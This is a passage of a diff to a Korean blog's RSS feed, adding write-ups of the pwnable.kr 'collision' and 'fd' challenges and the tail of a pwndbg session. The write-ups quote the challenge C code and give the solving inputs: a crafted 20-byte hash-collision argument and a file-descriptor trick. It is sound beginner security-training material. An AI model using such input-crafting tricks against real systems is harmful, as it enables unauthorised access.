+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x000000000040119f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;59&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;leave&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x00000000004011a0&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;ret&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;dump.&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;pwndbg&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x6c2070&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;x496628:&lt;/span&gt;	&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;UPX...&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;sounds&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;delivery&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;pwndbg&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr collision</title>
+        <link>https://appealso.github.io/p/pwnable.kr-collision/</link>
+        <pubDate>Sat, 22 Oct 2022 09:59:50 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-collision/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-collision/pwn.png" alt="Featured image of post pwnable.kr collision" /&gt;&lt;p&gt;해당 문제를 실행하면 아래와 같은 코드가 주어진다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x21DD09EC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;usage : %s [passcode]&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;passcode length should be 20 bytes&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;check_password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/cat flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;wrong passcode.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;위에 코드를 해석해보면 20byte가 입력되어야하고, hashcode에 대입된 0x21DD09EC와 비교하여 플래그를 출력하는 것을 볼 수 있다. 0x21DD09EC만 입력할 경우 20byte가 되지 않기 때문에 이를 4로 나누어준 뒤 나머지를 더하는 방식으로 답을 도출할 수 있었다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0x21DD09EC = \xC8\xCE\xC5\x06&amp;quot;*4+&amp;quot;\xcc\xce\xc5\x06 &amp;lt;&amp;ndash; 리틀엔디언 방식으로 쓰여있어서 이렇게 표현&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;col@pwnable:~$ ./col &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;\xC8\xCE\xC5\x06&amp;#34;*4+&amp;#34;\xcc\xce\xc5\x06&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+daddy! I just managed to create a &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; collision :&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr fd</title>
+        <link>https://appealso.github.io/p/pwnable.kr-fd/</link>
+        <pubDate>Sat, 22 Oct 2022 09:54:30 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-fd/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-fd/pwn.png" alt="Featured image of post pwnable.kr fd" /&gt;&lt;p&gt;해당 문제를 실행하면 아래와 같은 코드가 주어진다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pass argv[1] a number&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1234&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;LETMEWIN&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;good job :)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/cat flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;learn about Linux file IO&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;코드를 해석해보면 0x1234와 비교한 뒤  LETMEWIN을 입력하면 플레그를 출력하는것을 볼수 있다. 0x1234는 10진수로 4660이기 때문에 아래와 같이 입력하여 답을 얻을 수 있었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;fd@pwnable:~$ ./fd &lt;span class=&#34;m&#34;&gt;4660&lt;/span&gt;
+LETMEWIN
+good job :&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+mommy! I think I know what a file descriptor is!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>안드로이드 기초 정리</title>
         <link>https://appealso.github.io/p/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC/</link>
         <pubDate>Wed, 20 Jul 2022 20:33:30 +0900</pubDate>
